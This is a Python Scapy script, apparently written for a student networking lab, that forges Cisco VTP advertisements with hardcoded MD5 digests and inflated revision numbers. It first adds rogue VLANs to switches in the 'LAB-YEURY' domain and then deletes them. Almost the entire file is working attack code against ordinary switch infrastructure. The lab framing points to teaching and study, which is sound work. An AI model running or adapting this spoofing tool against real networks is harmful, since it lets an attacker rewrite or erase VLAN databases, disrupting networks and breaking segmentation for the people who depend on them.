#!/usr/bin/env python3
# ============================================================
# VTP Attack Script - Version Final
# Autor: Yeury Lopez | Matricula: 2025-0780
# Descripcion: Agrega y borra VLANs via VTP spoofing
# Requisitos: pip3 install scapy
# Uso: sudo python3 vtp_attack.py
# ============================================================
#
# NOTA: El MD5 hardcodeado es especifico para el dominio
# LAB-YEURY sin password. Si cambias el dominio o agregas
# password, debes obtener el nuevo MD5 del debug del switch:
# SW1# debug sw-vlan vtp packets
# ============================================================

from scapy.all import *
import struct
import time

IFACE   = "eth2"
SRC_MAC = get_if_hwaddr(IFACE)
DST_MAC = "01:00:0c:cc:cc:cc"
DOMAIN  = "LAB-YEURY"

def pad_domain(domain):
    return domain.encode().ljust(32, b'\x00')

def build_vlan_info(vlan_id, vlan_name):
    name_bytes  = vlan_name.encode()
    name_len    = len(name_bytes)
    padded_name = name_bytes.ljust(((name_len + 3) // 4) * 4, b'\x00')
    info_len    = 1+1+1+1+2+2+2+2+len(padded_name)
    return (
        bytes([info_len])          +
        b'\x00'                    +
        b'\x01'                    +
        bytes([name_len])          +
        struct.pack('>H', vlan_id) +
        struct.pack('>H', vlan_id) +
        struct.pack('>H', 1500)    +
        b'\x00\x00'                +
        padded_name
    )

def send_vtp(vlans, revision, md5):
    domain_padded = pad_domain(DOMAIN)
    domain_len    = len(DOMAIN)
    snap          = b'\xaa\xaa\x03\x00\x00\x0c\x20\x03'

    summary = (
        b'\x02'                     +
        b'\x01'                     +
        b'\x01'                     +
        bytes([domain_len])         +
        domain_padded               +
        struct.pack('>I', revision) +
        b'\x00\x00\x00\x00'         +
        b'\x00' * 12                +
        md5                         +
        b'\x00\x00\x00\x00'
    )

    subset = (
        b'\x02'                     +
        b'\x02'                     +
        b'\x01'                     +
        bytes([domain_len])         +
        domain_padded               +
        struct.pack('>I', revision)
    )
    for vlan_id, vlan_name in vlans:
        subset += build_vlan_info(vlan_id, vlan_name)

    payload1 = snap + summary
    payload2 = snap + subset

    def build_frame(src, dst, payload):
        src_bytes = bytes.fromhex(src.replace(':', ''))
        dst_bytes = bytes.fromhex(dst.replace(':', ''))
        length    = struct.pack('>H', len(payload))
        return dst_bytes + src_bytes + length + payload

    frame1 = build_frame(SRC_MAC, DST_MAC, payload1)
    frame2 = build_frame(SRC_MAC, DST_MAC, payload2)

    pkt1 = Ether(frame1)
    pkt2 = Ether(frame2)

    print("[*] Enviando Summary Advertisement...")
    sendp(pkt1, iface=IFACE, verbose=True)
    time.sleep(1)
    print("[*] Enviando Subset Advertisement...")
    sendp(pkt2, iface=IFACE, verbose=True)
    time.sleep(0.5)
    print("[*] Reenviando Subset Advertisement...")
    sendp(pkt2, iface=IFACE, verbose=True)

if __name__ == "__main__":
    print("=" * 55)
    print("  VTP Attack | Yeury Lopez | 2025-0780")
    print("=" * 55)
    print(f"  Interfaz : {IFACE}")
    print(f"  MAC      : {SRC_MAC}")
    print(f"  Dominio  : {DOMAIN}")
    print("=" * 55)

    # MD5 para PASO 1 (revision 999, VLANs 1,10,20,99,100,200)
    MD5_AGREGAR = b'\x70\x88\x16\xBA\x21\x7D\x36\x82\xB4\x9E\x3D\xA2\x9A\x6B\x2E\xED'

    # PASO 1: Agregar VLANs maliciosas
    print("\n[*] PASO 1: Agregando VLANs 100 y 200...")
    vlans_agregar = [
        (1,   "default"),
        (10,  "ATACANTE"),
        (20,  "VICTIMA"),
        (99,  "MANAGEMENT"),
        (100, "VLAN-HACK-100"),
        (200, "VLAN-HACK-200"),
    ]
    send_vtp(vlans_agregar, revision=999, md5=MD5_AGREGAR)
    print("[+] Verifica en SW1/SW2: show vlan brief")

    input("\n[*] Presiona ENTER para PASO 2: Borrar VLANs...\n")

    # MD5 para PASO 2 (revision 1999, VLANs originales sin 100 y 200)
    MD5_BORRAR = b'\xC6\x24\x9B\x61\xB8\x5D\x16\xF8\x8F\x63\x6D\x34\x54\xCD\x07\xBA'

    # PASO 2: Borrar VLANs maliciosas
    print("[*] PASO 2: Borrando VLANs 100 y 200...")
    vlans_borrar = [
        (1,    "default"),
        (10,   "ATACANTE"),
        (20,   "VICTIMA"),
        (99,   "MANAGEMENT"),
        (1002, "fddi-default"),
        (1003, "trcrf-default"),
        (1004, "fddinet-default"),
        (1005, "trbrf-default"),
    ]
    send_vtp(vlans_borrar, revision=1999, md5=MD5_BORRAR)
    print("[+] Verifica en SW1/SW2: show vlan brief")

    print("\n[*] Ataque VTP completado!")
    print("=" * 55)
